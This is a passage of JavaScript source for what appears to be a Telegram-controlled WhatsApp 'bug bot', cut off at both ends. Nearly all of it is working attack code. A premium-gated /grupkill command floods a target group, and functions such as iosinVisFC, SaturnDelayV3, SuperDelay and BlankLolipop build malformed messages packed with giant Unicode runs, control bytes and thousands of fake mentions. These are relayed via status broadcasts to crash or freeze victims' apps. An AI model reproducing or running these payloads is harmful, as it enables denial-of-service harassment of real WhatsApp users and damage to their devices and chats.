║ Premium users only.
║
╚═══════════════════╝`
    );
  }

  const paired = userPairs.find(u => u.telegramId === userId);
  if (!paired || !sessions.has(paired.whatsappNumber)) {
    return sendWithBanner(
`╔═❖ PAIR REQUIRED ❖═╗
║
║ Pair & connect your WhatsApp.
║
╚═══════════════════╝`
    );
  }

  if (!input) {
    return sendWithBanner(
`╔═❖ GRUPKILL ❖═╗
║
║ Usage:
║ /grupkill 12345@g.us
║ /grupkill 6263-626@g.us
║
╚═══════════════════╝`
    );
  }

  let groupid = input.endsWith("@g.us") ? input : `${input}@g.us`;

  if (!/^\d+(?:-\d+)?@g\.us$/.test(groupid)) {
    return sendWithBanner(
`╔═❖ INVALID JID ❖═╗
║
║ Supported formats only.
║
╚═══════════════════╝`
    );
  }

  try {
    const sock = sessions.get(paired.whatsappNumber);

    await sendWithBanner(
`╔═❖ GROUPKILL STARTED ❖═╗
║
║ Target:
║ ${groupid}
║
╚═════════════════════╝`
    );

    for (let i = 0; i < 200; i++) {
      await groupmix(sock, groupid);
      await sleep(500);
      await BlankLolipop(sock, groupid);
      await sleep(500);
    }

    return sendWithBanner(
`╔═❖ COMPLETED ❖═╗
║
║ Target:
║ ${groupid}
║
╚═════════════════╝`
    );

  } catch (e) {
    console.error(e);
    return sendWithBanner(
`╔═❖ FAILED ❖═╗
║
║ Execution error.
║
╚═════════════════╝`
    );
  }
});




// Function IosCrash
async function iosinVisFC(sock, target) {
   try {
      let locationMessage = {
         degreesLatitude: -9.09999262999,
         degreesLongitude: 199.99963118999,
         jpegThumbnail: null,
         name: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(15000),
         address: "\u0000" + "𑇂𑆵𑆴𑆿𑆿".repeat(10000),
         url: `https://kominfo.${"𑇂𑆵𑆴𑆿".repeat(25000)}.com`,
      };

      let extendMsg = {
         extendedTextMessage: { 
            text: ". ҉҈⃝⃞⃟⃠⃤꙰꙲꙱‱ᜆᢣ" + "𑇂𑆵𑆴𑆿".repeat(60000),
            matchedText: ".welcomel...",
            description: "𑇂𑆵𑆴𑆿".repeat(25000),
            title: "𑇂𑆵𑆴𑆿".repeat(15000),
            previewType: "NONE",
            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/4gIoSUNDX1BST0ZJTEUAAQEAAAIYAAAAAAIQAABtbnRyUkdCIFhZWiAAAAAAAAAAAAAAAABhY3NwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAA9tYAAQAAAADTLQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAlkZXNjAAAA8AAAAHRyWFlaAAABZAAAABRnWFlaAAABeAAAABRiWFlaAAABjAAAABRyVFJDAAABoAAAAChnVFJDAAABoAAAAChiVFJDAAABoAAAACh3dHB0AAAByAAAABRjcHJ0AAAB3AAAADxtbHVjAAAAAAAAAAEAAAAMZW5VUwAAAFgAAAAcAHMAUgBHAEIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAFhZWiAAAAAAAABvogAAOPUAAAOQWFlaIAAAAAAAAGKZAAC3hQAAGNpYWVogAAAAAAAAJKAAAA+EAAC2z3BhcmEAAAAAAAQAAAACZmYAAPKnAAANWQAAE9AAAApbAAAAAAAAAABYWVogAAAAAAAA9tYAAQAAAADTLW1sdWMAAAAAAAAAAQAAAAxlblVTAAAAIAAAABwARwBvAG8AZwBsAGUAIABJAG4AYwAuACAAMgAwADEANv/bAEMABgQFBgUEBgYFBgcHBggKEAoKCQkKFA4PDBAXFBgYFxQWFhodJR8aGyMcFhYgLCAjJicpKikZHy0wLSgwJSgpKP/bAEMBBwcHCggKEwoKEygaFhooKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKCgoKP/AABEIAIwAjAMBIgACEQEDEQH/xAAcAAACAwEBAQEAAAAAAAAAAAACAwQGBwUBAAj/xABBEAACAQIDBAYGBwQLAAAAAAAAAQIDBAUGEQcSITFBUXOSsdETFiZ0ssEUIiU2VXGTJFNjchUjMjM1Q0VUYmSR/8QAGwEAAwEBAQEBAAAAAAAAAAAAAAECBAMFBgf/xAAxEQACAQMCAwMLBQAAAAAAAAAAAQIDBBEFEhMhMTVBURQVM2FxgYKhscHRFjI0Q5H/2gAMAwEAAhEDEQA/ALumEmJixiZ4p+bZyMQaYpMJMA6Dkw4sSmGmItMemEmJTGJgUmMTDTFJhJgUNTCTFphJgA1MNMSmGmAxyYaYmLCTEUPR6LiwkwKTKcmMjISmEmWYR6YSYqLDTEUMTDixSYSYg6D0wkxKYaYFpj0wkxMWMTApMYmGmKTCTAoamEmKTDTABqYcWJTDTAY1MYnwExYSYiioJhJiUz1z0LMQ9MOMiC6+nSexrrrENM6CkGpEBV11hxrrrAeScpBxkQVXXWHCsn0iHknKQSloRPTJLmD9IXWBaZ0FINSOcrhdYcbhdYDydFMJMhwrJ9I30gFZJKkGmRFVXWNhPUB5JKYSYqLC1AZT9eYmtPdQx9JEupcGUYmy/wCz/LOGY3hFS5v6dSdRVXFbs2kkkhW0jLmG4DhFtc4fCpCpOuqb3puSa3W/kdzY69ctVu3l4Ijbbnplqy97XwTNrhHg5xzPqXbUfNnE2Ldt645nN2cZdw7HcIuLm/hUnUhXdNbs2kkoxfzF7RcCsMBtrOpYRnB1JuMt6bfQdbYk9ctXnvcvggI22y3cPw3tZfCJwjwM45kStqS0zi7Vuwuff1B2f5cw7GsDldXsKk6qrSgtJtLRJeYGfsBsMEs7WrYxnCU5uMt6bfDQ6+x172U5v/sz8IidsD0wux7Z+AOEeDnHM6TtqPm3ibVuwueOZV8l2Vvi2OQtbtSlSdOUmovTijQfUjBemjV/VZQdl0tc101/Bn4Go5lvqmG4FeXlBRdWjTcoqXLULeMXTcpIrSaFCVq6lWKeG+45iyRgv7mr+qz1ZKwZf5NX9RlEjtJxdr+6te6/M7mTc54hjOPUbK5p0I05xk24RafBa9ZUZ0ZPCXyLpXWnVZqEYLL9QWasq0sPs5XmHynuU/7dOT10XWmVS0kqt1Qpy13ZzjF/k2avmz7uX/ZMx/DZft9r2sPFHC4hGM1gw6pb06FxFQWE/wAmreqOE/uqn6jKLilKFpi9zb0dVTpz0jq9TWjJMxS9pL7tPkjpdQjGKwjXrNvSpUounFLn3HtOWqGEek+A5MxHz5Tm+ZDu39VkhviyJdv6rKMOco1vY192a3vEvBEXbm9MsWXvkfgmSdjP3Yre8S8ERNvGvqvY7qb/AGyPL+SZv/o9x9jLsj4Q9hr1yxee+S+CBH24vTDsN7aXwjdhGvqve7yaf0yXNf8ACBH27b39G4Zupv8Arpcv5RP+ORLshexfU62xl65Rn7zPwiJ2xvTCrDtn4B7FdfU+e8mn9Jnz/KIrbL/hWH9s/Ab9B7jpPsn4V9it7K37W0+xn4GwX9pRvrSrbXUN+jVW7KOumqMd2Vfe6n2M/A1DOVzWtMsYjcW1SVOtTpOUZx5pitnik2x6PJRspSkspN/QhLI+X1ysV35eZLwzK+EYZeRurK29HXimlLeb5mMwzbjrXHFLj/0suzzMGK4hmm3t7y+rVqMoTbhJ8HpEUK1NySUTlb6jZ1KsYwpYbfgizbTcXq2djTsaMJJXOu/U04aLo/MzvDH9oWnaw8Ua7ne2pXOWr300FJ04b8H1NdJj2GP7QtO1h4o5XKaqJsy6xGSu4uTynjHqN+MhzG/aW/7T5I14x/Mj9pr/ALT5I7Xn7Uehrvoo+37HlJ8ByI9F8ByZ558wim68SPcrVMaeSW8i2YE+407Yvd0ZYNd2m+vT06zm468d1pcTQqtKnWio1acJpPXSSTPzXbVrmwuY3FlWqUK0eU4PRnXedMzLgsTqdyPka6dwox2tH0tjrlOhQjSqxfLwN9pUqdGLjSpwgm9dIpI+q0aVZJVacJpct6KZgazpmb8Sn3Y+QSznmX8Sn3I+RflUPA2/qK26bX8vyb1Sp06Ud2lCMI89IrRGcbY7qlK3sLSMk6ym6jj1LTQqMM4ZjktJYlU7sfI5tWde7ryr3VWdWrLnOb1bOdW4Uo7UjHf61TuKDpUotZ8Sw7Ko6Ztpv+DPwNluaFK6oTo3EI1KU1pKMlqmjAsPurnDbpXFjVdKsk0pJdDOk825g6MQn3Y+Qcc14/038+7HyOnlNPwNq1qzTyqb/wAX5NNzvdUrfLV4qkknUjuRXW2ZDhkPtC07WHih17fX2J1Izv7ipWa5bz4L8kBTi4SjODalFpp9TM9WrxJZPJv79XdZVEsJG8mP5lXtNf8AafINZnxr/ez7q8iBOpUuLidavJzqzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR4mMi9RFJpnsYJDYpIBBpgWg1FNHygj5MNMBnygg4wXUeIJMQxkYoNICLDTApBKKGR4C0wkwDoOiw0+AmLGJiLTKWmHFiU9GGmdTzsjosNMTFhpiKTHJhJikw0xFDosNMQmMiwOkZDkw4sSmGmItDkwkxUWGmAxiYyLEphJgA9MJMVGQaYihiYaYpMJMAKcnqep6MCIZ0MbWQ0w0xK5hoCUxyYaYmIaYikxyYSYpcxgih0WEmJXMYmI6RY1MOLEoNAWOTCTFRfHQNAMYmMjIUEgAcmFqKiw0xFH//Z",
            thumbnailDirectPath: "/v/t62.36144-24/32403911_656678750102553_6150409332574546408_n.enc?ccb=11-4&oh=01_Q5AaIZ5mABGgkve1IJaScUxgnPgpztIPf_qlibndhhtKEs9O&oe=680D191A&_nc_sid=5e03e0",
            thumbnailSha256: "eJRYfczQlgc12Y6LJVXtlABSDnnbWHdavdShAWWsrow=",
            thumbnailEncSha256: "pEnNHAqATnqlPAKQOs39bEUXWYO+b9LgFF+aAF0Yf8k=",
            mediaKey: "8yjj0AMiR6+h9+JUSA/EHuzdDTakxqHuSNRmTdjGRYk=",
            mediaKeyTimestamp: "1743101489",
            thumbnailHeight: 641,
            thumbnailWidth: 640,
            inviteLinkGroupTypeV2: "DEFAULT"
         }
      };
      
      let msg1 = generateWAMessageFromContent(target, {
         viewOnceMessage: { message: { locationMessage } }
      }, {});
      
      let msg2 = generateWAMessageFromContent(target, {
         viewOnceMessage: { message: { extendMsg } }
      }, {});

      for (const msg of [msg1, msg2]) {
         await sock.relayMessage('status@broadcast', msg.message, {
            messageId: msg.key.id,
            statusJidList: [target],
            additionalNodes: [{
               tag: 'meta',
               attrs: {},
               content: [{
                  tag: 'mentioned_users',
                  attrs: {},
                  content: [{
                     tag: 'to',
                     attrs: { jid: target },
                     content: undefined
                  }]
               }]
            }]
         });
      }
      
      console.log(chalk.red.bold("─────「 ⏤!Crash iOS Invisible!⏤ 」─────"));
   } catch (err) {
      console.error(err);
   }
};


//Function Saturn Delay Hard 
async function SaturnDelayV3(sock, target) {
    let permissionX = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "⟅༑𝐒𝖆𝖙𝖚𝖗𝖓⟅༑",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let permissionY = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "ᯓ| 𝗭𝖆𝖑𝖙𝖍𝖗𝖊𝖝 𝐒𝖆𝖙𝖚𝖗𝖓 ᝄ",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
               "#" +
               Math.floor(Math.random() * 16777215)
               .toString(16)
               .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        permissionX.message,
        {
            messageId: permissionX.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        permissionY.message,
        {
            messageId: permissionY.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}


//Function Delay Syardelay
async function SyarDellay(sock, target) {
  try {
    const stickerMsg = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
          },
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileLength: "99999999",
            seconds: 9999,
            ptt: true,
            streamingSidecar: "AAAA",
            mediaKeyTimestamp: "1743848703",
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "1" + Math.floor(Math.random() * 999999) + "@s.whatsapp.net"
                )
              ],
              forwardingScore: 9999,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: "🎵"
              }
            }
          },
          contextInfo: {
            ephemeralExpiration: 0,
            forwardingScore: 999,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
              "#" +
              Math.floor(Math.random() * 0xffffff)
                .toString(16)
                .padStart(6, "0"),
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 9999,
            isForwarded: true,
            quotedMessage: {
              viewOnceMessage: {
                message: {
                  interactiveResponseMessage: {
                    body: { text: "MakLo", format: "DEFAULT" },
                    nativeFlowMessage: {
                      buttons: [
                        {
                          name: "single_select",
                          buttonParamsJson: "\x10".repeat(5000)
                        },
                        {
                          name: "call_permission_request",
                          buttonParamsJson: "ោ៝".repeat(13000)
                        },
                        {
                          name: "carousel_message",
                          buttonParamsJson:
                            "\x10".repeat(5000) + "ោ៝".repeat(6000)
                        }
                      ],
                      messageParamsJson: "ោ៝".repeat(1000),
                      version: 3
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const stickerMsgLite = {
      viewOnceMessage: {
        message: {
          stickerMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_573578875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
            mimetype: "image/webp",
            fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
            fileLength: "1173741824",
            mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
            fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
            directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
            mediaKeyTimestamp: "1743225419",
            isAnimated: false,
            viewOnce: false,
            contextInfo: {
              mentionedJid: [
                target,
                ...Array.from({ length: 1900 }, () =>
                  "92" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              isSampled: true,
              participant: target,
              remoteJid: "status@broadcast",
              forwardingScore: 9999,
              isForwarded: true,
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: { text: "MakLo", format: "DEFAULT" },
                      nativeFlowResponseMessage: {
                        name: "call_permission_request",
                        paramsJson: "\u0000".repeat(99999),
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = generateWAMessageFromContent(target, stickerMsg, {});

    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [
                {
                  tag: "to",
                  attrs: { jid: target },
                  content: undefined
                }
              ]
            }
          ]
        }
      ]
    });
  } catch (err) {
    console.error(err);
  }
}


//Function private Group 
async function groupmix(sock, groupId) {
  try {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "13135550002@newsletter",
        newsletterName: "᭡꧈".repeat(50000),
        caption: "p" + "\u0000".repeat(10000),
        inviteExpiration: "0",
      },
    };

    await sock.relayMessage(groupId, msg, {
      messageId: "GBLANK-" + Date.now(),
    });

    console.log(`✅ groupBlank executed successfully on ${groupId}`);
  } catch (err) {
    console.error("❌ groupBlank failed:", err);
  }
}

//Superdelayhard
async function SuperDelay(sock, target, mention) {
  console.log(chalk.bold.red(`SYED BUG BOT🐉 Success Sending Bug Delay ${target}`));
  let parse = true;
  let SID = "5e03e0&mms3";
  let key = "10000000_2012297619515179_5714769099548640934_n.enc";
  let type = `image/webp`;
  if (11 > 9) {
    parse = parse ? false : true;
  }

  const mentionedList = [
    "13135550002@s.whatsapp.net",
    ...Array.from({ length: 20000 }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    ),
  ];

  const message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: `https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=${SID}=true`,
          fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
          fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
          mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
          mimetype: type,
          directPath:
            "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
          fileLength: {
            low: Math.floor(Math.random() * 1000),
            high: 0,
            unsigned: true,
          },
          mediaKeyTimestamp: {
            low: Math.floor(Math.random() * 1700000000),
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            participant: target,
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                { length: 1999 },
                () =>
                  "1" +
                  Math.floor(Math.random() * 5000000) +
                  "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: Math.floor(Math.random() * -20000000),
            high: 555,
            unsigned: parse,
          },
          isAvatar: parse,
          isAiSticker: parse,
          isLottie: parse,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  const VoxDelay = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "ཀ ⏤͟͟͞͞𝗙𝗿𝘅𝗱𝗘𝘅𝗼𝘁𝗶𝗰𝘀.𝗷𝘀۞ // ཀ",
            format: "DEFAULT",
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0003".repeat(1045000),
            version: 3,
          },
        },
      },
    },
  };

  const TesHard = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      caption: "\u0000".repeat(104500),
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
    },
  };

  const Rawrr = {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2,
        },
        interactiveMessage: {
          contextInfo: {
            stanzaId: sock.generateMessageTag(),
            participant: "0@s.whatsapp.net",
            quotedMessage: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                mimetype:
                  "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                fileLength: "9999999999999",
                pageCount: 3567587327,
                mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                fileName: "ཀ ⏤͟͟͞͞𝗙𝗿𝘅𝗱𝗘𝘅𝗼𝘁𝗶𝗰𝘀.𝗷𝘀۞ // ཀ",
                fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                directPath:
                  "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1735456100",
                contactVcard: true,
                caption: "",
              },
            },
          },
          body: {
            text:
              "ཀ ⏤͟͟͞͞𝗙𝗿𝘅𝗱𝗘𝘅𝗼𝘁𝗶𝗰𝘀.𝗷𝘀۞ // ཀ" + "ꦾ".repeat(77777),
          },
          nativeFlowMessage: {
            buttons: Array.from({ length: 11 }, () => ({
              name: "cta_url",
              buttonParamsJson: "\u0000".repeat(10000),
            })),
          },
        },
      },
    },
  };

  const msg1 = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveMessage: Rawrr.viewOnceMessage.message.interactiveMessage } },
  }, {});

  const msg2 = generateWAMessageFromContent(target, {
    viewOnceMessage: { message: { interactiveResponseMessage: VoxDelay.viewOnceMessage.message.interactiveResponseMessage } },
  }, {});

  const msg3 = generateWAMessageFromContent(target, TesHard, {});

  for (const msg of [msg1, msg2, msg3]) {
    await sock.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [target],
      additionalNodes: [
        {
          tag: "meta",
          attrs: {},
          content: [
            {
              tag: "mentioned_users",
              attrs: {},
              content: [{ tag: "to", attrs: { jid: target }, content: undefined }],
            },
          ],
        },
      ],
    });
  }

  if (mention) {
    await sock.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg1.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "true" },
            content: undefined,
          },
        ],
      }
    );
  }
}

//function jammerzombie
async function LocaX(sock, target) {
  const generateLocationMessage = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: 21.1266,
          degreesLongitude: -11.8199,
          name: "x",
          url: "https://t.me/XameliaXD",
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from({ length: 1900 }, () =>
                "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
              )
            ],
            isSampled: true,
            participant: target,
            remoteJid: "status@broadcast",
            forwardingScore: 999999,
            isForwarded: true,
            quotedMessage: {
              extendedTextMessage: {
                text: "\u0000".repeat(100000)
              }
            },
            externalAdReply: {
              advertiserName: "whats !",
              title: "your e idiot ?",
              body: "{ x.json }",
              mediaType: 1,
              renderLargerThumbnail: true,
              jpegThumbnail: null,
              sourceUrl: "https://example.com"
            },
            placeholderKey: {
              remoteJid: "0@s.whatsapp.net",
              fromMe: false,
              id: "ABCDEF1234567890"
            }
          }
        },
        nativeFlowMessage: {
          buttons: [
            {
              name: "payment_method",
              buttonParamsJson: "{}" + "\u0000".repeat(100000)
            }
          ],
          messageParamsJson: "{}"
        }
      }
    }
  }

  const msg = generateWAMessageFromContent("status@broadcast", generateLocationMessage, {})

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target } }]
      }]
    }]
  }, { participant: target })
}

//New Group Func
async function BlankLolipop(sock, groupId) {
  try {
    const msg = {
      newsletterAdminInviteMessage: {
        newsletterJid: "13135550002@newsletter",
        newsletterName: "ꦽꦾ" + "ꦽ".repeat(50000),
        caption: "༼LOLIPOP" + "ꦾ".repeat(10000),
        inviteExpiration: "0",
      },
    };

    await sock.relayMessage(groupId, msg, {
      messageId: "GBLANK-" + Date.now(),
    });

    console.log(`✅ BlankLolipop executed successfully on ${groupId}`);
  } catch (err) {
    console.error("❌ BlankLolipop failed:", err);
  }
}



//New XtravsHardDelay 
async function XtravsHardDelay(sock, target) {

  const Xtravs = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999"),
  });

  await sock.relayMessage("status@broadcast", Xtravs.message, {
    messageId: Xtravs.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

  // SECOND PAYLOAD
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "𒑡𝗫𝘁𝗿𝗮𝘃𝗮𝘀𝗡𝗲𝗰𝗿𝗼𝘀𝗶𝘀៚",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 9741,
    isForwarded: true,
    font: Math.floor(Math.random() * 99999999),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "999999"),
  });

  await sock.relayMessage("status@broadcast", payload.message, {
    messageId: payload.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });

}

//Floods Delay 
async function Floods(sock, target, mention) {
  const media = { imageMessage: undefined };

  const megaContent = {
    viewOnceMessage: {
